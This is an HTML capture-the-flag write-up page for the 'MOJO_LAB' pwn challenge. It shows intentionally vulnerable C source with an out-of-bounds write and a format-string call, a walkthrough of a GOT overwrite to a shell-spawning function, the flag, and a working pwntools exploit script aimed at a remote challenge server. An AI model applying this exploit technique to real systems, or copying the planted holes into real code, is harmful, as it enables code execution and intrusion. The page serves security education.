@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MOJO_LAB // Rogue_Net</title>
+    <meta name="description" content="# MOJO_LAB ``">
+    <link rel="stylesheet" href="../../../../static/css/style.css">
+</head>
+<body>
+    <!-- Genjutsu Transition Overlay -->
+    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
+        <div class="eyelid eyelid-top"></div>
+        <div class="eyelid eyelid-bottom"></div>
+        <div class="genjutsu-eye">
+                <svg viewBox="0 0 200 200">
+                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
+                    <!-- Base 3-Tomoe -->
+                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
+                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
+                        <circle cx="100" cy="100" r="16" fill="#000"/>
+                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
+                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                    </g>
+                    <!-- Uploaded Image Mangekyo -->
+                    <defs>
+                        <clipPath id="circleClip">
+                            <circle cx="100" cy="100" r="98" />
+                        </clipPath>
+                    </defs>
+                    <image href="../../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
+                </svg>
+        </div>
+    </div>
+    <div class="scanlines"></div>
+    <div class="scroll-indicator" id="scrollIndicator"></div>
+    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
+    <div class="pwndbg-bg" id="pwndbgBg"></div>
+
+    <div class="container" style="gap: 40px;">
+
+        <a href="../../../../index.html" class="back-link">← pwndbg> back</a>
+
+        <div class="chall-header">
+            <h1><span class="prefix">./</span>MOJO_LAB<span class="cursor-blink">_</span></h1>
+            <div class="chall-meta-row">
+                <span class="tag">PWN</span>
+                <span>MOJO-JOJO CTF</span>
+                <span>0xc199e3d4</span>
+                
+                
+                <span>
+                    <span class="difficulty">
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                    </span>
+                </span>
+            </div>
+        </div>
+
+        <!-- Description -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DESCRIPTION</div>
+            <div class="code-block">
+                # MOJO_LAB ``
+            </div>
+        </div>
+
+        
+        <!-- Source Code / Disasm -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DISASM // SOURCE</div>
+            
+            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// main.c</div>
+            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+
+/* 
+   MOJO JOJO&#39;S LAZY LAB
+   &#34;I Mojo Jojo shall defeat the Powerpuff Girls with my Lazy Linker!&#34;
+*/
+
+// Global buffers
+char chemical_x[100];
+long dna_sequences[10];
+
+void lab_win() {
+    const char *msg = &#34;\n[MOJO JOJO]: NOOOOO! You have compromised my laboratory!\n&#34;;
+    write(1, msg, strlen(msg));
+    system(&#34;/bin/sh&#34;);
+    exit(0);
+}
+
+void setup() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+}
+
+void print_str(const char *s) {
+    write(1, s, strlen(s));
+}
+
+void banner() {
+    print_str(&#34;        _---_        \n&#34;);
+    print_str(&#34;       /     \\      \n&#34;);
+    print_str(&#34;      | () () |     \n&#34;);
+    print_str(&#34;       \\  ^  /      \n&#34;);
+    print_str(&#34;        |||||       \n&#34;);
+    print_str(&#34;      /-------\\     \n&#34;);
+    print_str(&#34;     | MOJO JO |    \n&#34;);
+    print_str(&#34;     |   LAB   |    \n&#34;);
+    print_str(&#34;      \\_______/     \n&#34;);
+    print_str(&#34;\n[MOJO JOJO]: Welcome to my secret laboratory!\n&#34;);
+    print_str(&#34;I, Mojo Jojo, am the most brilliant monkey in the world!\n\n&#34;);
+}
+
+int get_input() {
+    char buf[16];
+    if (fgets(buf, sizeof(buf), stdin) == NULL) exit(0);
+    return atoi(buf);
+}
+
+int main() {
+    setup();
+    banner();
+    
+    print_str(&#34;[LAB-SCANNER]: Input your Chemical X formula: &#34;);
+    if (fgets(chemical_x, sizeof(chemical_x), stdin) == NULL) exit(0);
+    
+    if (strchr(chemical_x, &#39;%&#39;)) {
+        print_str(&#34;[MOJO JOJO]: CURSES! Powerpuff Girls trickery detected!\n&#34;);
+        exit(1);
+    }
+
+    while(1) {
+        print_str(&#34;\n--- Laboratory Terminal ---\n&#34;);
+        print_str(&#34;1. Modify DNA Sequence\n&#34;);
+        print_str(&#34;2. Synthesize Chemical X\n&#34;);
+        print_str(&#34;3. Abandon Laboratory\n&#34;);
+        print_str(&#34;&gt; &#34;);
+        
+        int choice = get_input();
+        
+        if (choice == 1) { // DNA Modification (OOB Write)
+            print_str(&#34;DNA Slot Index: &#34;);
+            int idx = get_input();
+            print_str(&#34;Base Pair Value: &#34;);
+            int val = get_input();
+            
+            unsigned short *modifier = (unsigned short*)dna_sequences;
+            // The Monkey Math: XOR the index to hide the target
+            modifier[idx ^ 0x7050] = (unsigned short)val;
+            
+            print_str(&#34;[LAB]: DNA sequence updated successfully.\n&#34;);
+        } 
+        else if (choice == 2) { // Synthesis (Echo/Printf)
+            print_str(&#34;[SYNTHESIZER]: Processing formula: &#34;);
+            // This is where the GOT overwrite pays off.
+            // Using printf here ensures the exploit only triggers when requested.
+            printf(chemical_x); 
+            print_str(&#34;\nSynthesis complete.\n&#34;);
+        }
+        else {
+            print_str(&#34;[MOJO JOJO]: I shall return! FAREWELL!\n&#34;);
+            exit(0);
+        }
+    }
+    return 0;
+}
+</pre>
+            </div>
+            
+        </div>
+        
+
+        
+        <!-- Writeup -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
+            <div class="writeup-content">
+                <h1>MOJO LAB — Writeup</h1>
+<h2>Challenge Overview</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>PWN</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Hard</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td>r3t0x</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>OOB Write + GOT Overwrite</td>
+</tr>
+</tbody>
+</table>
+<h2>Reconnaissance</h2>
+<div class="codehilite"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>checksec<span class="w"> </span>./main
+<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
+<span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
+<span class="w">    </span>Stack:<span class="w">    </span>Canary<span class="w"> </span>found
+<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled
+<span class="w">    </span>PIE:<span class="w">      </span>PIE<span class="w"> </span>enabled
+</code></pre></div>
+
+<h2>Vulnerabilities</h2>
+<h3>1. OOB Write via XOR Index</h3>
+<div class="codehilite"><pre><span></span><code><span class="n">modifier</span><span class="p">[</span><span class="n">idx</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="mh">0x7050</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">short</span><span class="p">)</span><span class="n">val</span><span class="p">;</span>
+</code></pre></div>
+
+<p>The index is XOR'd with <code>0x7050</code> before use. By choosing <code>idx</code> carefully, we can write a 16-bit value <strong>anywhere relative to <code>dna_sequences</code></strong> — including the GOT.</p>
+<h3>2. Format String in Chemical X</h3>
+<div class="codehilite"><pre><span></span><code><span class="n">printf</span><span class="p">(</span><span class="n">chemical_x</span><span class="p">);</span><span class="w">  </span><span class="c1">// controlled input!</span>
+</code></pre></div>
+
+<p>The <code>'%'</code> character is filtered from <code>chemical_x</code>, but the OOB write lets us overwrite GOT entries (e.g., <code>printf@got → lab_win</code>).</p>
+<h2>Strategy</h2>
+<ol>
+<li>Calculate the offset from <code>dna_sequences</code> to <code>printf@got</code></li>
+<li>XOR that index with <code>0x7050</code> to get the required input index</li>
+<li>Use two 16-bit writes to overwrite <code>printf@got</code> with <code>lab_win</code></li>
+<li>Trigger option 2 ("Synthesize Chemical X") → calls <code>printf(chemical_x)</code> → now jumps to <code>lab_win()</code></li>
+<li><code>lab_win()</code> calls <code>system("/bin/sh")</code></li>
+</ol>
+<h2>Result</h2>
+<div class="codehilite"><pre><span></span><code><span class="p">[</span><span class="n">MOJO</span><span class="w"> </span><span class="n">JOJO</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="n">NOOOOO</span><span class="o">!</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">compromised</span><span class="w"> </span><span class="n">my</span><span class="w"> </span><span class="n">laboratory</span><span class="o">!</span>
+<span class="n">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">MOJO</span><span class="o">-</span><span class="n">JOJO</span><span class="p">{</span><span class="n">m0j0_l4b_0wn3d</span><span class="p">}</span>
+</code></pre></div>
+            </div>
+        </div>
+        
+
+        
+        <!-- Exploit / Solver -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
+            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
+                <span style="color: var(--gdb-green);">$</span> python3 solve.py
+            </div>
+            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">from pwn import *
+import sys
+
+# Set context
+context.binary = binary = ELF(&#39;./main&#39;)
+context.log_level = &#39;info&#39;
+
+if args.REMOTE:
+    host = args.HOST or &#39;4.233.210.175&#39;
+    port = int(args.PORT or 9007)
+    p = remote(host, port)
+else:
+    p = process(&#39;./main&#39;)
+
+def get_menu():
+    p.recvuntil(b&#39;&gt; &#39;)
+
+def write_val(idx, val):
+    get_menu()
+    p.sendline(b&#39;1&#39;) # Modify DNA Sequence
+    p.recvuntil(b&#39;DNA Slot Index: &#39;)
+    # The Monkey Math: inverse the XOR to hit the target
+    p.sendline(str(idx ^ 0x7050).encode())
+    p.recvuntil(b&#39;Base Pair Value: &#39;)
+    p.sendline(str(val).encode())
+    p.recvuntil(b&#39;[LAB]: DNA sequence updated successfully.\n&#39;)
+
+def trigger():
+    get_menu()
+    p.sendline(b&#39;2&#39;) # Synthesize Chemical X
+
+# Exploit Logic
+# 1. Target: printf@GOT
+# 2. Value: lab_win() address
+# 3. Primitive: 2-byte write via &#39;unsigned short&#39; array
+
+# Note: In the new main.c, global names are chemical_x and dna_sequences
+got_printf = binary.got[&#39;printf&#39;]
+sym_dna = binary.symbols[&#39;dna_sequences&#39;]
+sym_win = binary.symbols[&#39;lab_win&#39;]
+
+log.info(f&#34;printf@GOT: {hex(got_printf)}&#34;)
+log.info(f&#34;dna_sequences: {hex(sym_dna)}&#34;)
+log.info(f&#34;lab_win: {hex(sym_win)}&#34;)
+
+# Calculate start index
+# dna_sequences + i * 2 = got_printf =&gt; i = (got_printf - dna_sequences) / 2
+idx_start = (got_printf - sym_dna) // 2
+log.info(f&#34;Index start: {idx_start}&#34;)
+
+chunks = [
+    (sym_win &gt;&gt; 0) &amp; 0xFFFF,
+    (sym_win &gt;&gt; 16) &amp; 0xFFFF,
+    (sym_win &gt;&gt; 32) &amp; 0xFFFF,
+    (sym_win &gt;&gt; 48) &amp; 0xFFFF
+]
+
+p.recvuntil(b&#39;Input your Chemical X formula: &#39;)
+p.sendline(b&#34;HELLO-MOJO&#34;) # Initial formula
+
+for i, chunk in enumerate(chunks):
+    log.info(f&#34;Writing chunk {i}: {hex(chunk)} at idx {idx_start + i}&#34;)
+    write_val(idx_start + i, chunk)
+
+log.info(&#34;Triggering synthesized formula...&#34;)
+trigger()
+
+p.interactive()
+</pre>
+            </div>
+        </div>
+        
+
+        <div style="height: 80px;"></div>
+    </div>
+
+    <script src="../../../../static/js/main.js"></script>
+</body>
+</html>
